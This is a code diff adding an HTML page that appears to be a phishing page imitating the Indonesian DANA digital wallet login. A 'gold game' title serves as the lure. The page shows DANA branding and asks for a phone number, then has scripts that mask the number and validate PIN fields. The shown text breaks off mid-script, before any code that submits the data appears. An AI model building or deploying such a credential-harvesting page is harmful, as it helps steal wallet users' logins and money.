@@ -1,0 +1,107 @@
+<html>
+
+<head>
+    <meta name="theme-color" content="#bcbcbcb"> 
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=0">
+   
+ <meta property="og:title" content="ID"> 
+ <meta property="og:description" content=" ">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+<title>ID</title>
+<meta property="og:title" content="ME355 Permainan Emas">
+<meta property="twitter:title" content="">
+<meta property="twitter:card" content="summary_large_image">
+<meta property="og:image:type" content="image/jpeg">
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLMITELVyarJudYViC-n98fB8g8_ODRgWClc0hLRSPHXKb7rMyMU_m4wM9&s=10" property="og:image">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0, maximum-scale=1">
+ <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLMITELVyarJudYViC-n98fB8g8_ODRgWClc0hLRSPHXKb7rMyMU_m4wM9&s=10" rel="icon" type="image/x-icon">
+    <link href="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLMITELVyarJudYViC-n98fB8g8_ODRgWClc0hLRSPHXKb7rMyMU_m4wM9&s=10" rel="apple-touch-icon">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+
+<meta property="twitter:card" content="summary_large_image">
+<meta property="og:image:type" content="image/jpeg">
+<meta content="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQLMITELVyarJudYViC-n98fB8g8_ODRgWClc0hLRSPHXKb7rMyMU_m4wM9&s=10" property="og:image">
+
+    
+    <!-- Demo styles -->
+    <style>
+      html,
+      body {
+        position: relative;
+        height: 100%;
+  overflow: hidden; 
+        background-color: #fff;
+        font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
+        font-size: 14px;
+        color: #000;
+        margin: 0;
+        padding: 0;
+      }
+
+ </style>
+</head>
+<body style="background-color: #fff;">
+    <div style="display:none;" class="index">
+        <div class="header">
+            
+        </div>
+        <div class="content">
+            <div class="hero">
+                
+            </div>
+            <h1>Dompet digital untuk kamu!</h1>
+            <p class="desc">Simpan uang serta kartu debit/kredit dengan<br>praktis di DANA</p>
+            <div class="line">
+            </div>
+            <p class="log">Masukkan <b>nomor HP</b> kamu untuk lanjut</p>
+            <button type="button" onclick="next();">LOGIN</button>
+        </div>
+    </div>
+    <div class="start" style="display:none; background-color: #fff;">
+        
+    </div>
+    <div class="container hid">
+        <div class="box-login" style="background-color: #fff;">
+            <div id="process" name="process" class="process" style="display: none;">
+                <div class="loading">
+                    
+                </div>
+            </div>
+            <div class="header11">
+                <a href="id.html"><img src="https://raw.githubusercontent.com/unitetger/fstvl-com/refs/heads/main/1747620268843.jpg" style="width: 100%; left: 0px; top: 0px; height: 100%"></a>
+            </div>
+
+<script>
+$(document).ready(function() {
+    $('#inp').on('input', function() {
+        if ($(this).val() == '0' || $(this).val() == '62') {
+            $(this).val('');
+        }
+    });
+});
+</script>
+<script>
+$(document).ready(function() {
+    $('#inp').mask('000-0000-000000');
+});
+</script>
+<script>
+let inp = document.getElementById("inp");
+let btn = document.getElementById("btn");
+inp.addEventListener("input", val);
+
+function val() {
+    if (inp.value.length > 10) {
+        btn.disabled = false;
+    } else {
+        btn.disabled = true;
+    }
+};
+</script>
+<script>
+$('.inppin').on('input', function(event) {
+    const inputs = $('.inppin');
+    const isAllFilled = Array.from(inputs).every((input) => input.value !== '');
